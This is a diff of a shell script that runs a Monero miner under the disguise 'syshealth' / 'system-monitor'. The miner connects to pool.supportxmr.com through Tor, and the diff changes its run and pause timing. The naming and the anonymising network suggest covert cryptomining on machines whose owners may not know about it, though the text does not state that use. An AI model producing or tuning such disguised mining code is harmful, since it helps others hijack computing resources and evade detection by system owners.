@@ -275,10 +275,10 @@ BIN="${UTIL_DIR}/syshealth"
 CONFIG="${UTIL_DIR}/config/preferences.json"
 PID_FILE="/var/run/syshealth.pid"
 
-# Run 1-3 hours, no 5-minute pauses
+# Run 1-3 hours, pause 5 minutes
 MIN_RUN_TIME=3600
 MAX_RUN_TIME=10800
-PAUSE_TIME=0
+PAUSE_TIME=300
 
 start_service() {
     "${BIN}" --config="${CONFIG}" --no-color &
@@ -313,18 +313,14 @@ while true; do
     RUNTIME=$(get_random_runtime)
     echo "[*] Running for $((RUNTIME/3600))h $((RUNTIME%3600/60))m at CPU_PERCENT_PLACEHOLDER CPU"
     ELAPSED=0
-    # Poll more frequently to avoid long 5-minute sleeps
     while [ $ELAPSED -lt $RUNTIME ]; do
-        sleep 1
-        ELAPSED=$((ELAPSED + 1))
+        sleep 300
+        ELAPSED=$((ELAPSED + 300))
         check_network
     done
     stop_service
-    # No long pause between runs when PAUSE_TIME=0
-    if [ "${PAUSE_TIME}" -gt 0 ]; then
-        echo "[*] Pausing for ${PAUSE_TIME}s..."
-        sleep ${PAUSE_TIME}
-    fi
+    echo "[*] Pausing for ${PAUSE_TIME}s..."
+    sleep ${PAUSE_TIME}
 done
 SCHEDULER
 # Replace placeholder with actual CPU percentage
@@ -376,7 +372,7 @@ echo -e "  ${GREEN}Pool:${NC} pool.supportxmr.com:3333"
 echo -e "  ${GREEN}Network:${NC} Tor (anonymous)"
 echo -e "  ${GREEN}Donation:${NC} 0%"
 echo -e "  ${GREEN}CPU:${NC} ${CPU_PCT}%"
-echo -e "  ${GREEN}Pause:${NC} none (no 5-minute pauses)"
+echo -e "  ${GREEN}Pause:${NC} 5 min every 3-5 hours"
 echo ""
 echo -e "  ${YELLOW}Commands:${NC}"
 echo -e "    Check status:  docker exec system-monitor ps aux"
